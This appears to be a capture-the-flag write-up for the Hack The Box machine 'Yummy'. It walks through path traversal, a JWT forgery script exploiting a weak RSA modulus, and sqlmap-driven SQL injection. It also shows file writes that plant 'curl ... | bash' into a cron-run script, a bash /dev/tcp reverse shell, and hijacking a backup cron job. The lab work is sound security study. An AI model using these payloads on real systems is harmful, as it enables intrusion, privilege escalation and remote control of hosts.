## Enumeration

Starting with an **Nmap scan**:

![NMAP](/static/writeups/HTB-S-VI/yummy/1.png)

Nmap reveals that ports 22 and 80 are open. I began exploring the website, `yummy.htb`. After adding this entry to `/etc/hosts`, I used `dirsearch` but found nothing significant. However, I discovered a **local file traversal vulnerability** in the "save iCalendar" functionality, accessible after booking a table.

![LFI Vulnerability](/static/writeups/HTB-S-VI/yummy/2.png)

Intercepting the request with Burp Suite, I tested a payload to access `/etc/passwd`:

```
GET /export/../../../../../etc/passwd
```

This response returned the contents of `/etc/passwd`:

![Passwd File](/static/writeups/HTB-S-VI/yummy/3.png)

Since I could access any files, I searched for valuable files and found something interesting in `/etc/crontab`:

![Crontab](/static/writeups/HTB-S-VI/yummy/4.png)
![Crontab Details](/static/writeups/HTB-S-VI/yummy/5.png)

### Exploring `/data/scripts`

I explored the `data/scripts` directory and found `table_cleanup.sh`, which cleans tables in MySQL. It also contains credentials for the database:

![Cleanup Script](/static/writeups/HTB-S-VI/yummy/16.png)

In `dbmonitor.sh`, I found a script that checks if the MySQL service is down and restarts it if needed:

![DB Monitor Script](/static/writeups/HTB-S-VI/yummy/18.png)

`app_backup.sh` goes to `/var/www/` directory and zips content of `/opt/app` as `backupapp.zip` file:

![Backup App](/static/writeups/HTB-S-VI/yummy/7.png)

Extracting `backupapp.zip` provided the web application’s source code. Here are the files:

![Extracted Files](/static/writeups/HTB-S-VI/yummy/9.png)

In `app.py`, I located the same database credentials as those in `cleanup.sh`:

```
db_config = {
    'host': '127.0.0.1',
    'user': 'chef',
    'password': '3wDo7gSRZIwIHRxZ!',
    'database': 'yummy_db',
    'cursorclass': pymysql.cursors.DictCursor,
    'client_flag': CLIENT.MULTI_STATEMENTS
}
```

### JWT Vulnerability

In the `config` folder, the `signature.py` file revealed session token generation logic.

Code:

```
#!/usr/bin/python3

from Crypto.PublicKey import RSA
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import sympy


# Generate RSA key pair
q = sympy.randprime(2**19, 2**20)
n = sympy.randprime(2**1023, 2**1024) * q
e = 65537
p = n // q
phi_n = (p - 1) * (q - 1)
d = pow(e, -1, phi_n)
key_data = {'n': n, 'e': e, 'd': d, 'p': p, 'q': q}
key = RSA.construct((key_data['n'], key_data['e'], key_data['d'], key_data['p'], key_data['q']))
private_key_bytes = key.export_key()

private_key = serialization.load_pem_private_key(
    private_key_bytes,
    password=None,
    backend=default_backend()
)
public_key = private_key.public_key()
```

Upon decoding the JWT token in base64, the `n` value of the RSA encryption was exposed:

![JWT Decoding](/static/writeups/HTB-S-VI/yummy/12.png)

Modifying the role to `administrator` was initially unsuccessful due to signature verification, which hashes the payload and header with a secret key. However, with access to the `n` value, I modified `signature.py` to create an admin token.

Using the following Python script, I generated a modified JWT with administrator privileges:

```
from Crypto.PublicKey import RSA
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import sympy
import jwt
import base64

# Your session token
original_jwt = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...<trimmed>"

# Decoding and modifying the JWT
n = int(s.split('"n":')[1].split('"')[1])
e = 65537
factors = sympy.factorint(n)
p, q = list(factors.keys())
phi_n = (p - 1) * (q - 1)
d = pow(e, -1, phi_n)
key = RSA.construct((n, e, d, p, q))
signing_key = key.export_key()

# Modifying role to administrator
decoded_payload = jwt.decode(
    original_jwt,
    signing_key,
    algorithms=["RS256"],
    options={"verify_signature": False}
)
decoded_payload['role'] = 'administrator'
new_jwt = jwt.encode(decoded_payload, signing_key, algorithm='RS256')
print("Modified JWT with administrator role:", new_jwt)
```

Using the new token in `x-auth` for `/admindashboard`, I accessed the admin panel:

![Admin Panel](/static/writeups/HTB-S-VI/yummy/13.png)

The admin panel contained limited functionality, but I identified an error-based SQL injection vulnerability in the search function.

```
sqlmap -r request
```

![SQL Injection](/static/writeups/HTB-S-VI/yummy/14.png)

I already have admin user there is not so much more left to do with admin functionality. so, with the SQL injection vulnerability, I enumerated user and tables with sqlmap.

```
sqlmap -r request --dbs --batch  # Lists all databases

[11:09:35] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[11:09:35] [INFO] fetching database names
[11:09:36] [INFO] retrieved: 'information_schema'
[11:09:37] [INFO] retrieved: 'performance_schema'
[11:09:37] [INFO] retrieved: 'yummy_db'
available databases [3]:
[*] information_schema
[*] performance_schema
[*] yummy_db

[11:09:37] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/yummy.htb'

[*] ending @ 11:09:37 /2024-11-12/
```

Enumerating tables

```
sqlmap -r request -D yummy_db --tables # Lists all tables

Database: yummy_db
[4 tables]
+--------------+
| appointments |
| potato       |
| sqlmapfile   |
| users        |
+--------------+

[11:24:37] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/yummy.htb'


```

Enumerating users tables

```
sqlmap -r request -D yummy_db -T users --dump # Lists all users

Database: yummy_db
Table: users
[0 entries]
+----+---------+-------+----------+
| id | role_id | email | password |
+----+---------+-------+----------+
+----+---------+-------+----------+
```

users and appointments both table don't contain any interesting information

so, I checked the privilege of user

```
sqlmap -r request --privileges

[11:29:55] [INFO] retrieved: 'FILE'
database management system users privileges:
[*] 'chef'@'localhost' [1]:
    privilege: FILE

[11:29:55] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/yummy.htb'

```

Great, i got file permission which means i can read and write files. remember there were other cronjobs involving mysql, **db_monitor.sh** which restarts the `mysql` server if it’s down. We need to write something which will give us a `shell`.

Remember `mysql` user was executing **dbmonitor.sh** as cronjob and But there is also a `else` statement which does if **dbstatus.json** exits and doesn’t include `database is down` text, it `deletes` the .json file and executes the `first` `fixer-v` file in **/data/scripts**.

```
else
    if [ -f /data/scripts/dbstatus.json ]; then
        if grep -q "database is down" /data/scripts/dbstatus.json 2>/dev/null; then
            /usr/bin/echo "The database was down at $timestamp. Sending notification."
            /usr/bin/echo "$service was down at $timestamp but came back up." | /usr/bin/mail -s "$service was down!" root
            /usr/bin/rm -f /data/scripts/dbstatus.json
        else
            /usr/bin/rm -f /data/scripts/dbstatus.json
            /usr/bin/echo "The automation failed in some way, attempting to fix it."
            latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
            /bin/bash "$latest_version"
```

so first i will send this command to write something in **dbstatus.json**

```
http://yummy.htb/admindashboard?s=aa&o=ASC%3b+select+"0xPWNED"+INTO+OUTFILE++'/data/scripts/dbstatus.json'+%3b
```

then create a file named `fixer-v___` which is going to be first file in directory because of the `_`, the file is going to be executed as `mysql` user and gives us shell.

```
http://yummy.htb/admindashboard?s=aa&o=ASC%3b+select+"curl+10.10.14.60:80/shell.sh+|bash%3b"+INTO+OUTFILE++'/data/scripts/fixer-v___'+%3b
```

so to do this, i am opening netcat listener on my machine:

```
nc -nvlp 3669
```

this is the content inside shell.sh

```
bash -i >& /dev/tcp/10.10.14.60/3669 0>&1
```

which will be hosted in python server using:

```
python3 -m http.server 80
```

and got the shell

![SQL Injection](/static/writeups/HTB-S-VI/yummy/19.png)

I already got everything from db.so, mysql shell is not nedded

## Foothold

Inorder to get shell as **`www_data`** i just have to tweak things around little bit.
remember backup_script.sh will get executed as user **`www_data`**. so, i need to upload
shell.sh file and rename it to backup_script.sh:

```
mysql@yummy:/data/scripts$ wget http://10.10.14.60:80/shell.sh
wget http://10.10.14.60:80/shell.sh
--2024-11-12 06:49:43--  http://10.10.14.60/shell.sh
Connecting to 10.10.14.60:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 42 [text/x-sh]
Saving to: ‘shell.sh’

     0K                                                       100% 3.50M=0s

2024-11-12 06:49:44 (3.50 MB/s) - ‘shell.sh’ saved [42/42]

mysql@yummy:/data/scripts$ mv app_backup.sh ass && mv shell.sh app_backup.sh
mv app_backup.sh ass && mv shell.sh app_backup.sh
mysql@yummy:/data/scripts$
```

and i got a shell as www_data:

![SQL Injection](/static/writeups/HTB-S-VI/yummy/20.png)

### shell as qa user:

enumerating home directory i found user called qa:

```
www-data@yummy:~/app-qatesting/.hg$ ls -l /home/
ls -l /home/
total 8
drwxr-x--- 7 dev dev 4096 Nov 12 06:58 dev
drwxr-x--- 7 qa  qa  4096 Nov 12 05:17 qa

```

so, after searching for sometimes i found directory called as qa-testing in `/var/www/`:
and folder called '.hg' which was hidden:

![SQL Injection](/static/writeups/HTB-S-VI/yummy/21.png)

so, after digging in .hg folder for a while i found password in file called `app.py.i`

```
www-data@yummy:~/app-qatesting/.hg$ grep -r pass .
grep -r pass .
grep: ./wcache/checkisexec: Permission denied
grep: ./store/data/app.py.i: binary file matches
```

```
�<.`������6�߽��}�v�v�@P��D�2ӕ�_�B�Mu;G
                                     �.-1
                                         ��D�	�kk��Y益H���ΣVps
                                                                �K�a�0�VW��;h�������B�
                                                                                      ;ó~z�q�{�+>=�O_�q6� �"V˺&f�*�T㔇D��퍂��@��V([Q���������̋G��φ����>GQ$
�D��,3�eJoH|j�)�(𶠀yh]��6����~Z�[hY�
                                    �	�w�4L
{��]�ߚ�D������f�:�����s)�����}               �3�ZШ�݆{S?�m��*H�چ���V3�Y�(��]���
 ��L��S�eE��6K�6    'user': 'qa',
    'password': 'j*A*!******B', ---> password not shown
&E&�&�'#'�'�
�0+,0*d	����$4�p�"��_���6�.(�/�`�5	�P8*p�c����g� kwJj��*�zӦ9$՚��N;�Z�U�
    ĉ��D����P�*˅��\Q��]+'¤�2,%��-��Y��
                                      Ąb�,��d[I})u���r��}�X�����F��K>
                                                                     +���@t���k� 9��j��0�04�k��+�O�h���׷
```

## User Flag

I ssh with qa with above pasword and found userflag in /home/qa/user.txt:

![SQL Injection](/static/writeups/HTB-S-VI/yummy/22.png)

## Root Flag

**To be updated...**
